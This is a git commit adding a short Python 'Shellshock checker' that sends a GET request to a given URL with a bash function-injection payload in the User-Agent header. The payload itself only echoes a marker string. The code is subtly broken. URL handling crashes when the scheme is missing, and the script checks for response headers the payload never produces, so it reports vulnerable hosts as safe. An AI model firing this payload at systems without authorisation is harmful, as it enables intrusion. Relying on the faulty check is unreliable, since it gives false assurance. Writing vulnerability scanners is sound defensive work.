262b3d96f4137966df7c7482b3e70dc85fdb8511
cbk914 <cbk914@riseup.net>
2023-01-14 06:06:01 +0100

    Add python version

---
+++ shellshockcheck.py
@@ -0,0 +1,35 @@
+# Shellshock Checker
+# Author: cbk914
+import argparse
+import re
+from urllib.parse import urlparse
+import http.client
+
+def main():
+    # Define command line flag for target URL
+    parser = argparse.ArgumentParser(description="Check for Shellshock vulnerability")
+    parser.add_argument("-u", "--url", required=True, help="Target URL")
+    args = parser.parse_args()
+
+    # Check if the provided URL is in valid format
+    parsed_url = urlparse(args.url)
+    if parsed_url.scheme not in ["http", "https"]:
+        parsed_url = "https://" + parsed_url.geturl()
+    if not re.match(r"^[a-zA-Z0-9-.]+$", parsed_url.hostname):
+        parser.error("Invalid target format. Only URLs with valid hostname are allowed")
+
+    # Send the request
+    conn = http.client.HTTPSConnection(parsed_url.hostname)
+    headers = { "User-Agent": "() { :; }; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo 'Vulnerable!'" }
+    conn.request("GET", parsed_url.path, headers=headers)
+    resp = conn.getresponse()
+    conn.close()
+
+    # Check the response
+    if resp.status == 200 and ("X-CGI-Shellshock" in resp.headers or "X-Shellshock" in resp.headers):
+        print("VULNERABLE: The target is vulnerable to Shellshock.")
+    else:
+        print("SAFE: The target is not vulnerable to Shellshock.")
+
+if __name__ == "__main__":
+    main()
